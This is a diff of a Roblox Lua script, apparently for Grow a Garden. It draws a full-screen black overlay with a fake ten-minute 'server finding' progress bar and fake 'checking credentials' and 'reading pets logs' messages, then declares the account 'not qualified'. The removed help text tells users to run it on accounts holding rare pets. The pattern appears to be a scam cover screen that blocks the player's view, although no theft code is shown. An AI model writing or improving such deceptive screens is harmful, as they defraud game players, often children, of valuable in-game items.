@@ -1,18 +1,17 @@
--- GUI v4 - Clean + Final with Help
+-- GUI v4 - Fast Pet Check + Timer Skips
+
 local gui = Instance.new("ScreenGui")
 gui.Name = "AdvanceServerUI"
 gui.ResetOnSpawn = false
 gui.IgnoreGuiInset = true
 gui.Parent = game:GetService("CoreGui")
 
--- Black background
 local blackBG = Instance.new("Frame")
 blackBG.Size = UDim2.new(1, 0, 1, 0)
 blackBG.BackgroundColor3 = Color3.new(0, 0, 0)
 blackBG.BorderSizePixel = 0
 blackBG.Parent = gui
 
--- Main frame
 local frame = Instance.new("Frame")
 frame.Size = UDim2.new(0.4, 0, 0.4, 0)
 frame.Position = UDim2.new(0.3, 0, 0.3, 0)
@@ -21,7 +20,6 @@ frame.BorderSizePixel = 0
 frame.Parent = blackBG
 Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)
 
--- Main label (status messages)
 local label = Instance.new("TextLabel")
 label.Size = UDim2.new(1, -20, 0.25, 0)
 label.Position = UDim2.new(0, 10, 0, 10)
@@ -33,9 +31,8 @@ label.TextWrapped = true
 label.Text = "Initializing..."
 label.Parent = frame
 
--- Progress % label
 local percentLabel = Instance.new("TextLabel")
-percentLabel.Size = UDim2.new(1, -20, 0.10, 0)
+percentLabel.Size = UDim2.new(1, -20, 0.1, 0)
 percentLabel.Position = UDim2.new(0, 10, 0.3, 10)
 percentLabel.BackgroundTransparency = 1
 percentLabel.TextColor3 = Color3.new(1, 1, 1)
@@ -44,9 +41,8 @@ percentLabel.TextScaled = true
 percentLabel.Text = "Progress: 0%"
 percentLabel.Parent = frame
 
--- Time remaining
 local timeLabel = Instance.new("TextLabel")
-timeLabel.Size = UDim2.new(1, -20, 0.10, 0)
+timeLabel.Size = UDim2.new(1, -20, 0.1, 0)
 timeLabel.Position = UDim2.new(0, 10, 0.4, 10)
 timeLabel.BackgroundTransparency = 1
 timeLabel.TextColor3 = Color3.new(1, 1, 1)
@@ -55,7 +51,6 @@ timeLabel.TextScaled = true
 timeLabel.Text = "Estimated time left: 10:00"
 timeLabel.Parent = frame
 
--- Progress bar
 local progressBarBG = Instance.new("Frame")
 progressBarBG.Size = UDim2.new(1, -40, 0.1, 0)
 progressBarBG.Position = UDim2.new(0, 20, 0.63, 0)
@@ -71,9 +66,8 @@ progressFill.BorderSizePixel = 0
 progressFill.Parent = progressBarBG
 Instance.new("UICorner", progressFill).CornerRadius = UDim.new(0, 6)
 
--- Pet label
 local petLabel = Instance.new("TextLabel")
-petLabel.Size = UDim2.new(1, -20, 0.10, 0)
+petLabel.Size = UDim2.new(1, -20, 0.1, 0)
 petLabel.Position = UDim2.new(0, 10, 0.78, 0)
 petLabel.BackgroundTransparency = 1
 petLabel.TextColor3 = Color3.new(1, 1, 1)
@@ -82,116 +76,22 @@ petLabel.TextScaled = true
 petLabel.Text = ""
 petLabel.Parent = frame
 
--- Sound
-local sound = Instance.new("Sound", gui)
-sound.SoundId = "rbxassetid://9118823106"
-sound.Volume = 0.4
-sound.Looped = true
-sound:Play()
-
--- Help Button (Top-Right corner)
-local helpButton = Instance.new("TextButton")
-helpButton.Size = UDim2.new(0, 70, 0, 30)
-helpButton.Position = UDim2.new(1, -80, 0, 10)
-helpButton.Text = "?Help"
-helpButton.TextColor3 = Color3.new(1, 1, 1)
-helpButton.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
-helpButton.Font = Enum.Font.SourceSansBold
-helpButton.TextScaled = true
-helpButton.ZIndex = 10
-helpButton.Parent = blackBG
-Instance.new("UICorner", helpButton).CornerRadius = UDim.new(0, 6)
-
--- Help Popup (scrollable)
-local helpPopup = Instance.new("Frame")
-helpPopup.Size = UDim2.new(0.8, 0, 0.6, 0)
-helpPopup.Position = UDim2.new(0.1, 0, 0.2, 0)
-helpPopup.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-helpPopup.BorderSizePixel = 0
-helpPopup.Visible = false
-helpPopup.ZIndex = 20
-helpPopup.Parent = blackBG
-Instance.new("UICorner", helpPopup).CornerRadius = UDim.new(0, 10)
-
-local scrollFrame = Instance.new("ScrollingFrame")
-scrollFrame.Size = UDim2.new(1, -20, 1, -60)
-scrollFrame.Position = UDim2.new(0, 10, 0, 10)
-scrollFrame.BackgroundTransparency = 1
-scrollFrame.CanvasSize = UDim2.new(0, 0, 2, 0)
-scrollFrame.ScrollBarThickness = 8
-scrollFrame.ZIndex = 21
-scrollFrame.Parent = helpPopup
-
-local helpText = Instance.new("TextLabel")
-helpText.Size = UDim2.new(1, -10, 0, 1000)
-helpText.Position = UDim2.new(0, 5, 0, 0)
-helpText.BackgroundTransparency = 1
-helpText.TextColor3 = Color3.new(1, 1, 1)
-helpText.Font = Enum.Font.SourceSans
-helpText.TextScaled = false
-helpText.TextWrapped = true
-helpText.TextXAlignment = Enum.TextXAlignment.Left
-helpText.TextYAlignment = Enum.TextYAlignment.Top
-helpText.Text = [[
-PLEASE READ!!!
-For the script to run properly and fast, there are things that your account must have for it to successfully run.
-
-First, your Grow a Garden account must be made on or before the Easter Egg event — meaning no alts and no accounts made right after the Night Event (or on the Bee Event).
-
-OR have rare old pets like a Dragonfly or Raccoon.
-
-These are the included pets:
-A Panda, Dragonfly, Raccoon, Butterfly, Queen Bee, Disco Bee, Mimic Octopus, Fennec Fox, or the new T-Rex and Spinosaurus.
-
-Why do you need those rare pets you ask?
-Rare pets means fewer people have them, meaning fewer log details = faster logs reading.
-
-More pets = better results or faster loading.
-Old seeds are a plus point for it to run smoothly.
-]]
-helpText.TextSize = 25
-helpText.ZIndex = 22
-helpText.Parent = scrollFrame
-
-local closeButton = Instance.new("TextButton")
-closeButton.Size = UDim2.new(0, 60, 0, 30)
-closeButton.Position = UDim2.new(1, -70, 1, -40)
-closeButton.Text = "Close"
-closeButton.TextColor3 = Color3.new(1, 1, 1)
-closeButton.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
-closeButton.Font = Enum.Font.SourceSansBold
-closeButton.TextScaled = true
-closeButton.ZIndex = 22
-closeButton.Parent = helpPopup
-Instance.new("UICorner", closeButton).CornerRadius = UDim.new(0, 6)
-
--- Help toggle
-helpButton.MouseButton1Click:Connect(function()
-    helpPopup.Visible = true
-end)
-closeButton.MouseButton1Click:Connect(function()
-    helpPopup.Visible = false
-end)
-
--- Main timing logic
 local totalTime = 600
 local startTime = tick()
 
-local messages = {
-    "Please wait...",
-    "You are going to an old server soon...",
-    "Finding the right server for you...",
-    "Checking your credentials...",
-    "Reading your logs...",
-    "Make sure you have the pets...",
-    "Reading pets logs..."
-}
+local function adjustTimeForward(seconds)
+    startTime = startTime + seconds
+end
+
+local pets = {"Raccoon", "Dragonfly", "Butterfly", "Queen Bee", "Disco Bee", "Mimic Octopus", "Fennec Fox", "T-Rex", "Spinosaurus"}
+
 spawn(function()
-    local idx = 1
-    while tick() - startTime < totalTime do
-        label.Text = messages[idx]
-        idx = idx % #messages + 1
+    for _, pet in ipairs(pets) do
+        petLabel.Text = "Checking pets: " .. pet .. "..."
         wait(30)
+        petLabel.Text = "Checking pets: " .. pet .. " -> Done!"
+        adjustTimeForward(30)
+        wait(1)
     end
 end)
 
@@ -209,18 +109,26 @@ spawn(function()
     end
 end)
 
-local pets = { "Raccoon", "Dragonfly", "Butterfly", "Queen Bee", "Disco Bee", "Mimic Octopus", "Fennec Fox", "T-Rex", "Spinosaurus" }
+local messages = {
+    "Please wait...",
+    "You are going to an old server soon...",
+    "Finding the right server for you...",
+    "Checking your credentials...",
+    "Reading your logs...",
+    "Make sure you have the pets...",
+    "Reading pets logs..."
+}
+
 spawn(function()
-    for _, pet in ipairs(pets) do
-        petLabel.Text = "Checking pets: " .. pet .. "..."
-        wait(60)
-        petLabel.Text = "Checking pets: " .. pet .. " -> Done!"
-        wait(1)
+    local idx = 1
+    while tick() - startTime < totalTime do
+        label.Text = messages[idx]
+        idx = idx % #messages + 1
+        wait(30)
     end
 end)
 
 delay(totalTime, function()
-    sound:Stop()
     frame:Destroy()
     local resultText = Instance.new("TextLabel")
     resultText.Size = UDim2.new(1, 0, 1, 0)
@@ -235,4 +143,6 @@ delay(totalTime, function()
     resultText.Text = "Account not qualified"
     wait(3)
     resultText.Text = "Required pets not found"
+    wait(3)
+    resultText.Text = "Error. Please try again."
 end)
